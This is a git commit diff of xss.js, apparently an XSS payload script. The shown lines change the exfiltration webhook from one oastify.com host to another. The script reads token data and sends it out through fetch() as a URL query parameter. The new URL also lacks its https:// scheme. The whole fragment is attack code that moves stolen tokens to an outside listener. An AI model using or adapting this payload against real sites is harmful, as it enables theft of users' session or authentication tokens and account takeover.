fded5661e74f2889dd8e394776482c512c2abf5c
sinux <101449554+sin-60@users.noreply.github.com>
2025-10-25 14:37:10 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -4,7 +4,7 @@
     
     // 2. The exfiltration URL (your OAST webhook)
     // We use a query parameter to send the data.
-    const webhookUrl = 'https://qwqy4v8rxcoztu86tnx3mvuqjhp8dz1o.oastify.com/';
+    const webhookUrl = '5lrdtax6mrdei9xli2mibaj58wen2fq4.oastify.com/';
     
     // 3. Make the request to send the data
     fetch(webhookUrl + '?token_data=' + encodeURIComponent(data));
